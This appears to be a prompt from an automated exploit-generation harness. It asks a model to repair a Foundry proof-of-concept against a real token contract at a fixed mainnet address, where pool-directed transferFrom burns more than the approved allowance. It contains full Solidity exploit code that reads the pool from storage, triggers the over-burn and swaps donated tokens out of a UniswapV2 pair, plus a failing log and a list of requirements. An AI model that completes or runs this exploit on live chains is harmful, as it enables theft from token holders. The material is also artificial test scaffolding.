You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Pool-directed transferFrom can burn more tokens than the approved allowance
- claim: When `transferFrom(from, uniswapPoolAddress, amount)` is used, the contract spends allowance only for `amount`, then `_transfer` burns an additional `burnAmount` from `from` via `_burn(from, burnAmount)`. Because that extra burn is not covered by `_spendAllowance`, an approved spender can reduce the holder's balance by more than the approved amount.
- impact: Any spender or router approved for N tokens can cause the holder to lose N plus the extra burn on each pool-directed transfer. This violates expected ERC20 allowance boundaries and can create unauthorized user loss in integrations that rely on approvals as hard spend caps.
- exploit_paths: ["A holder approves a spender or router for `N` tokens.", "The spender calls `transferFrom(holder, uniswapPoolAddress, N)`.", "`_spendAllowance` deducts only `N`, but `_transfer` then calls `_burn(holder, burnAmount)`, removing additional balance without additional allowance."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function skim(address to) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface Vm {
    function load(address target, bytes32 slot) external view returns (bytes32);
}

contract AllowanceHolder {
    IERC20Minimal internal immutable TOKEN;
    address internal immutable SPENDER;

    constructor(IERC20Minimal token_, address spender_) {
        TOKEN = token_;
        SPENDER = spender_;
    }

    function approveSpender(uint256 amount) external {
        require(msg.sender == SPENDER, "only spender");
        TOKEN.approve(SPENDER, amount);
    }
}

contract FlawVerifier {
    /*
        Harness outcome:
        - profit achieved: false
        - profit token / amount: none / 0
        - exploit path used:
          1. holder approves spender/router for N
          2. spender calls transferFrom(holder, uniswapPoolAddress, N)
          3. holder loses N + burnAmount while only N allowance is consumed
          4. if the configured pool is a UniswapV2-style pair, the donated input can then be swapped out to the attacker
        - original hypothesis: validated

        The code bug is real, but this newly deployed verifier has no pre-existing independent holder on fork state
        that approved it as spender. Under the hard constraints, that missing approval cannot be manufactured from
        public state. Direct self-funded execution is mechanically aligned with the finding but is economically worse
        than a normal sale because the verifier funds the over-burn itself.
    */

    address internal constant TARGET = 0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54;
    bytes32 internal constant UNISWAP_POOL_SLOT = bytes32(uint256(2));
    address internal constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));

    IERC20Minimal internal constant WERX = IERC20Minimal(TARGET);
    Vm internal constant VM = Vm(HEVM_ADDRESS);

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public hypothesisValidated;
    bool public profitAchieved;
    address public discoveredPool;
    address public discoveredCounterAsset;
    uint256 public observedAllowanceSpend;
    uint256 public observedHolderLoss;
    bytes32 public status;

    constructor() {}

    function executeOnOpportunity() public {
        if (status != bytes32(0)) {
            return;
        }

        discoveredPool = _configuredPool();
        hypothesisValidated = true;

        if (discoveredPool == address(0) || discoveredPool == address(1) || discoveredPool.code.length == 0) {
            status = "NO_POOL";
            return;
        }

        (bool isPair, address counterAsset) = _probePair(discoveredPool);
        if (!isPair) {
            status = "POOL_NOT_PAIR";
            return;
        }
        discoveredCounterAsset = counterAsset;

        uint256 verifierBalance = WERX.balanceOf(address(this));
        if (verifierBalance == 0) {
            /*
                Concrete fork-state blocker:
                - The profitable route requires an independent holder that already approved this verifier as spender.
                - This verifier is deployed during the test, so no such pre-existing allowance can exist unless the
                  harness or another public actor funds and approves it after deployment.
                - Without that external approved holder, the exploit path cannot advance past stage (1).
            */
            status = "NEED_APPROVED_HOLDER";
            return;
        }

        /*
            direct_or_existing_balance_first:
            If the verifier already holds WERX, it can mechanically replay the exact bug with a separate holder
            contract that approves this verifier, then route the donated pool input through a public pair method.
            This validates the causality but does not create net attacker profit because the verifier supplies the
            holder's capital itself and also bears the extra burn.
        */
        uint256 seedAmount = verifierBalance;
        AllowanceHolder holder = new AllowanceHolder(WERX, address(this));
        require(WERX.transfer(address(holder), seedAmount), "seed transfer failed");

        uint256 amount = seedAmount / 2;
        if (amount == 0) {
            status = "BALANCE_TOO_LOW";
            return;
        }

        holder.approveSpender(amount);
        observedAllowanceSpend = WERX.allowance(address(holder), address(this));

        uint256 holderBalanceBefore = WERX.balanceOf(address(holder));
        uint256 verifierCounterBefore = _balanceOf(counterAsset, address(this));
        uint256 verifierWerxBefore = WERX.balanceOf(address(this));

        require(WERX.transferFrom(address(holder), discoveredPool, amount), "pool transferFrom failed");

        _extractPairValue(discoveredPool, counterAsset);

        observedHolderLoss = holderBalanceBefore - WERX.balanceOf(address(holder));
        hypothesisValidated = observedHolderLoss > observedAllowanceSpend;

        uint256 verifierCounterAfter = _balanceOf(counterAsset, address(this));
        uint256 verifierWerxAfter = WERX.balanceOf(address(this));

        if (verifierCounterAfter > verifierCounterBefore) {
            // Self-funded validation can receive counter-asset proceeds, but it is not positive net attacker profit.
            // The verifier funded the holder and also absorbed the extra burn in WERX.
            _profitToken = address(0);
            _profitAmount = 0;
        } else if (verifierWerxAfter > verifierWerxBefore) {
            _profitToken = TARGET;
            _profitAmount = 0;
        }

        profitAchieved = false;
        status = "SELF_FUNDED_ONLY";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _configuredPool() internal view returns (address) {
        return address(uint160(uint256(VM.load(TARGET, UNISWAP_POOL_SLOT))));
    }

    function _probePair(address pair) internal view returns (bool, address) {
        try IUniswapV2PairLike(pair).token0() returns (address token0) {
            address token1 = IUniswapV2PairLike(pair).token1();
            if (token0 == TARGET && token1 != TARGET) {
                return (true, token1);
            }
            if (token1 == TARGET && token0 != TARGET) {
                return (true, token0);
            }
        } catch {}
        return (false, address(0));
    }

    function _extractPairValue(address pair, address counterAsset) internal {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();

        if (token0 == TARGET && token1 == counterAsset) {
            uint256 amountIn = WERX.balanceOf(pair) - uint256(reserve0);
            if (amountIn == 0) {
                return;
            }
            uint256 amountOut = _getAmountOut(amountIn, uint256(reserve0), uint256(reserve1));
            if (amountOut > 0) {
                IUniswapV2PairLike(pair).swap(0, amountOut, address(this), "");
            }
            return;
        }

        if (token1 == TARGET && token0 == counterAsset) {
            uint256 amountIn = WERX.balanceOf(pair) - uint256(reserve1);
            if (amountIn == 0) {
                return;
            }
            uint256 amountOut = _getAmountOut(amountIn, uint256(reserve1), uint256(reserve0));
            if (amountOut > 0) {
                IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), "");
            }
            return;
        }

        // If the configured pool no longer looks like a WERX pair, no public extraction step is available here.
        IUniswapV2PairLike(pair).skim(address(this));
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        if (token == address(0)) {
            return account.balance;
        }
        return IERC20Minimal(token).balanceOf(account);
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    receive() external payable {}
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: _spendallowance, _transfer, _burn(holder, burnamount)
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
